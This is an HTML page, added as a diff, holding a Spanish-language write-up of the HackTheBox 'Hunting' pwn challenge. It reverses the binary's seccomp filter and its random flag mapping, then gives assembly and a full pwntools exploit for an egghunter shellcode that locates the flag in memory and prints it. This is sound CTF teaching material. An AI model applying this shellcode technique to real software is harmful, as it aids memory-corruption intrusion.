@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Hunting</title>
+
+  <meta name="description" content="Resolución del reto Hunting de la plataforma de HackTheBox">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Hunting">
+  <meta name="twitter:description" content="Resolución del reto Hunting de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/hackthebox/challenges.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Hunting">
+  <meta property="og:description" content="Resolución del reto Hunting de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/challenges.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/challenges.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Hunting" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/challenges.png" style="float: right; margin-right:0px; margin-left:0px; height:70px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Hunting</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/Hunting/hunting">binario</a> parece que espera una entrada donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, no devuelve absolutamente nada y corrompe de alguna forma inesperada sin más</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./hunting</span><span class="p">
+AAAAAAAABBBBBBBB
+zsh: segmentation fault (core dumped)  ./hunting  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a la función <code class="language-plaintext highlighter-rouge">setup</code> y guarda el valor de retorno en la variable llamada address, luego llama a <code class="language-plaintext highlighter-rouge">signal</code> indicando que si recibe un <code class="language-plaintext highlighter-rouge">SIGALRM</code> llame a <code class="language-plaintext highlighter-rouge">exit</code>, luego con <code class="language-plaintext highlighter-rouge">alarm</code> establece un tiempo de <code class="language-plaintext highlighter-rouge">10</code> segundos, entonces si el proceso dura mas de eso envia un <code class="language-plaintext highlighter-rouge">SIGALRM</code> y lo termina</p>
+<a href="/challenges/hunting/1.png" target="_blank"><div><p><img src="/challenges/hunting/1.png"></p></div></a>
+
+<p class="plain-text">Después de ello llama a la función <code class="language-plaintext highlighter-rouge">mmap</code> para reservar un espacio de memoria y le otorga permisos <code class="language-plaintext highlighter-rouge">3</code>, luego copia la dirección del valor de retorno en la variable <code class="language-plaintext highlighter-rouge">flag</code></p>
+<a href="/challenges/hunting/2.png" target="_blank"><div><p><img src="/challenges/hunting/2.png"></p></div></a>
+
+<p class="plain-text">Utiliza <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar la dirección que contiene el simbolo <code class="language-plaintext highlighter-rouge">HTB</code> a la variable <code class="language-plaintext highlighter-rouge">flag</code>, luego llama <code class="language-plaintext highlighter-rouge">memset</code> para luego rellenar todos los bytes de origen a <code class="language-plaintext highlighter-rouge">0</code>, llama a una función de <code class="language-plaintext highlighter-rouge">seccomp</code> que establece algunas reglas al llamar a las <code class="language-plaintext highlighter-rouge">syscalls</code></p>
+<a href="/challenges/hunting/3.png" target="_blank"><div><p><img src="/challenges/hunting/3.png"></p></div></a>
+
+<p class="plain-text">Después utilizando <code class="language-plaintext highlighter-rouge">mmap</code> establece permisos <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code> a la variable shellcode, luego recibe un buffer llamando a <code class="language-plaintext highlighter-rouge">read</code> el cual ejecuta después ejectando un <code class="language-plaintext highlighter-rouge">call eax</code></p>
+<a href="/challenges/hunting/6.png" target="_blank"><div><p><img src="/challenges/hunting/6.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">setup</code> inicia abriendo el archivo <code class="language-plaintext highlighter-rouge">/dev/urandom</code> con <code class="language-plaintext highlighter-rouge">open</code>, y llama a <code class="language-plaintext highlighter-rouge">read</code> para obtener un numero aleatorio de este archivo, cierra el archivo con <code class="language-plaintext highlighter-rouge">close</code> y genera un numero aleatorio con la función <code class="language-plaintext highlighter-rouge">srand</code> a partir del valor de retorno</p>
+<a href="/challenges/hunting/4.png" target="_blank"><div><p><img src="/challenges/hunting/4.png"></p></div></a>
+
+<p class="plain-text">Se inicia un bucle donde se compara la dirección generada con <code class="language-plaintext highlighter-rouge">0x5fffffff</code>, si es menor se llama a <code class="language-plaintext highlighter-rouge">rand</code> y desplaza <code class="language-plaintext highlighter-rouge">16</code> bits a la izquierda, si es mayor o igual compara que el valor sea menor o igual que <code class="language-plaintext highlighter-rouge">0xf7000000</code>, si esta en el rango devuelve el valor</p>
+<a href="/challenges/hunting/5.png" target="_blank"><div><p><img src="/challenges/hunting/5.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Si miramos las limitaciones de <code class="language-plaintext highlighter-rouge">seccomp</code> podemos ver las restricciones de <code class="language-plaintext highlighter-rouge">syscalls</code> respecto a funciones para ejecutar comandos como lo son <code class="language-plaintext highlighter-rouge">execve</code> o <code class="language-plaintext highlighter-rouge">execveat</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ seccomp-tools</span><span class="p"> dump ./hunting
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0002: 0x35 0x0a 0x00 0x40000000  if (A >= </span><span class="ve">0x40000000</span><span class="p">) goto 0013  
+ 0003: 0x15 0x09 0x00 0x0000000b  if (A == </span><span class="ve">execve</span><span class="p">) goto 0013
+ 0004: 0x15 0x08 0x00 0x00000166  if (A == </span><span class="ve">execveat</span><span class="p">) goto 0013
+ 0005: 0x15 0x07 0x00 0x00000127  if (A == </span><span class="ve">openat</span><span class="p">) goto 0013
+ 0006: 0x15 0x06 0x00 0x00000005  if (A == </span><span class="ve">open</span><span class="p">) goto 0013
+ 0007: 0x15 0x05 0x00 0x00000006  if (A == </span><span class="ve">close</span><span class="p">) goto 0013
+ 0008: 0x15 0x04 0x00 0x00000008  if (A == </span><span class="ve">creat</span><span class="p">) goto 0013
+ 0009: 0x15 0x03 0x00 0x00000056  if (A == </span><span class="ve">uselib</span><span class="p">) goto 0013
+ 0010: 0x15 0x02 0x00 0x00000002  if (A == </span><span class="ve">fork</span><span class="p">) goto 0013
+ 0011: 0x15 0x01 0x00 0x000000be  if (A == </span><span class="ve">vfork</span><span class="p">) goto 0013
+ 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0013: 0x06 0x00 0x00 0x00000000  return KILL</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que lo que enviemos se interpretará como instrucciones ensamblador, para comprobarlo enviaremos como shellcode un <code class="language-plaintext highlighter-rouge">int3</code> que actuará como breakpoint en el debugger y algunos <code class="language-plaintext highlighter-rouge">nops</code> extra para asegurarnos que se ejecute correctamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./hunting"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)  
+
+egghunter</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    int3
+    nop
+    nop
+    nop
+    nop
+"""</span><span class="p">)
+
+shell.send(egghunter)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit llega al breakpoint y se detiene al inicio de ejecutar los <code class="language-plaintext highlighter-rouge">nops</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+</span><span class="az">0xf3325001</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/4i $eip-1
+   </span><span class="az">0xf3325000</span><span class="p">:</span><span class="ve">  int3</span><span class="p">
+=> </span><span class="az">0xf3325001</span><span class="p">:</span><span class="ve">  nop</span><span class="p">
+   </span><span class="az">0xf3325002</span><span class="p">:</span><span class="ve">  nop</span><span class="p">
+   </span><span class="az">0xf3325003</span><span class="p">:</span><span class="ve">  nop</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, sabemos que la string de la flag se copió en una dirección aleatoria entre <code class="language-plaintext highlighter-rouge">0x5fffffff</code> y <code class="language-plaintext highlighter-rouge">0xf7000000</code>, también sabemos que el formato iniciará con <code class="language-plaintext highlighter-rouge">HTB{</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">search HTB{
+Searching for value: 'HTB{'
+</span><span class="sa">zero (deleted)  0x61b40000 </span><span class="p">'HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}'  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El nombre nos da una pista, usaremos una técnica muy conocida llamada <code class="language-plaintext highlighter-rouge">egghunter</code> el cual busca una string en toda la memoria, inicia moviendo a <code class="language-plaintext highlighter-rouge">edi</code> los primeros <code class="language-plaintext highlighter-rouge">4</code> bytes de la cadena que son <code class="language-plaintext highlighter-rouge">HTB{</code>, luego mueve a <code class="language-plaintext highlighter-rouge">edx</code> la dirección base desde donde puede iniciar, con un <code class="language-plaintext highlighter-rouge">or</code> obtenemos en <code class="language-plaintext highlighter-rouge">edx</code> la última dirección de la página</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">    mov </span><span class="mi">edi</span><span class="p">,</span><span class="mi"> 0x7b425448</span><span class="c1">   # $edi = HTB{</span><span class="p">
+    </span><span class="o">mov</span><span class="mi"> edx</span><span class="p">,</span><span class="mi"> 0x5fffffff</span><span class="c1">   # $edx = 0x5fffffff</span><span class="p">
+
+    </span><span class="o">.</span><span class="na">page</span><span class="p">:
+        </span><span class="o">or</span><span class="mi"> dx</span><span class="p">,</span><span class="mi"> 0xfff</span><span class="c1">      # get last addr in page  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">.find</code> inicia incrementando la dirección una unidad, luego guarda el estado de los registros y guarda en <code class="language-plaintext highlighter-rouge">ebx</code> la dirección de <code class="language-plaintext highlighter-rouge">edx + 4</code>, en <code class="language-plaintext highlighter-rouge">ecx</code> un <code class="language-plaintext highlighter-rouge">0</code> indica que se pueda leer, luego con una <code class="language-plaintext highlighter-rouge">syscall</code> llamamos a la función <code class="language-plaintext highlighter-rouge">access</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">    .</span><span class="na">find</span><span class="p">:
+       </span><span class="o">inc</span><span class="mi"> edx</span><span class="c1">            # increase memory counter  
+       </span><span class="o">pushad</span><span class="c1">             # save registers
+       </span><span class="o">lea</span><span class="mi"> ebx</span><span class="p">, [</span><span class="mi">edx</span><span class="o"> +</span><span class="mi"> 4</span><span class="p">]</span><span class="c1"> # $ebx = address
+       </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">       # $ecx = 0x0
+       </span><span class="o">push</span><span class="mi"> 0x21</span><span class="c1">          # access()
+       </span><span class="o">pop</span><span class="mi"> eax</span><span class="c1">            # $eax = access()
+       </span><span class="o">int</span><span class="mi"> 0x80</span><span class="c1">           # syscall</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si el valor de retorno termina con <code class="language-plaintext highlighter-rouge">0xf2</code> indica que el retorno es <code class="language-plaintext highlighter-rouge">-14</code> y que hubo un error de tipo <code class="language-plaintext highlighter-rouge">EFAULT</code>, luego restaura los registros, si hubo un error salta a <code class="language-plaintext highlighter-rouge">.page</code> para saltar a la siguiente página hasta que sea accesible, si ya es válida inicia un bucle donde compara el contenido de la dirección con <code class="language-plaintext highlighter-rouge">HTB{</code> hasta que sea igual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">       cmp </span><span class="mi">al</span><span class="p">,</span><span class="mi"> 0xf2</span><span class="c1">       # cmp return with EFAULT
+       </span><span class="o">popad</span><span class="c1">              # restore registers
+       </span><span class="o">jz .</span><span class="na">page</span><span class="c1">           # if zf == 1 -> increase page  
+       </span><span class="o">cmp</span><span class="p"> [</span><span class="mi">edx</span><span class="p">], </span><span class="mi">edi</span><span class="c1">     # cmp addr with HTB{
+       </span><span class="o">jnz .</span><span class="na">find</span><span class="c1">          # if zf == 0 -> increase addr  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez que tenemos en <code class="language-plaintext highlighter-rouge">edx</code> la dirección donde inicia la <code class="language-plaintext highlighter-rouge">flag</code> podemos guardarla en <code class="language-plaintext highlighter-rouge">ecx</code> comos segundo argumento de <code class="language-plaintext highlighter-rouge">write</code>, el primero es el descriptor donde usaremos <code class="language-plaintext highlighter-rouge">1</code> indicando el <code class="language-plaintext highlighter-rouge">stdout</code>, finalmente en edx la longitud que son <code class="language-plaintext highlighter-rouge">0x24</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">       mov</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> edx</span><span class="c1">       # $ecx = flag
+       </span><span class="o">push</span><span class="mi"> 0x1</span><span class="c1">           # stdout
+       </span><span class="o">pop</span><span class="mi"> ebx</span><span class="c1">            # $ebx = stdout
+       </span><span class="o">push</span><span class="mi"> 0x24</span><span class="c1">          # len
+       </span><span class="o">pop</span><span class="mi"> edx</span><span class="c1">            # $edx = len
+       </span><span class="o">push</span><span class="mi"> 0x4</span><span class="c1">           # write()
+       </span><span class="o">pop</span><span class="mi"> eax</span><span class="c1">            # $eax = write()  
+       </span><span class="o">int</span><span class="mi"> 0x80</span><span class="c1">           # syscall</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces el exploit envia un egghunter, este inicia en <code class="language-plaintext highlighter-rouge">0x5fffffff</code> a buscar paginas válidas con <code class="language-plaintext highlighter-rouge">access</code>, luego de ello incrementa la dirección por unidad hasta encontrar la dirección donde inicia con <code class="language-plaintext highlighter-rouge">HTB{</code>, una vez lo encontramos lo enviamos al <code class="language-plaintext highlighter-rouge">stdout</code> con <code class="language-plaintext highlighter-rouge">write</code>, al ejecutar nuestro exploit realiza todo el proceso y nos muestra la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./hunting"</span><span class="p">)
+
+egghunter</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    mov edi, 0x7b425448   # $edi = HTB{
+    mov edx, 0x5fffffff   # $edx = 0x5fffffff
+
+    .page:
+        or dx, 0xfff      # get last addr in page
+
+    .find:
+       inc edx            # increase memory counter
+       pushad             # save registers
+       lea ebx, [edx + 4] # $ebx = address
+       xor ecx, ecx       # $ecx = 0x0
+       push 0x21          # access()
+       pop eax            # $eax = access
+       int 0x80           # syscall
+
+       cmp al, 0xf2       # cmp return with EFAULT
+       popad              # restore registers
+       jz .page           # if zf == 1 -> increase page  
+       cmp [edx], edi     # cmp addr with HTB{
+       jnz .find          # if zf == 0 -> increase addr  
+
+       mov ecx, edx       # $ecx = flag
+       push 0x1           # stdout
+       pop ebx            # $ebx = stdout
+       push 0x24          # len
+       pop edx            # $edx = len
+       push 0x4           # write()
+       pop eax            # $eax = write()
+       int 0x80           # syscall
+"""</span><span class="p">)
+
+shell.send(egghunter)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './hunting': pid 148264  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
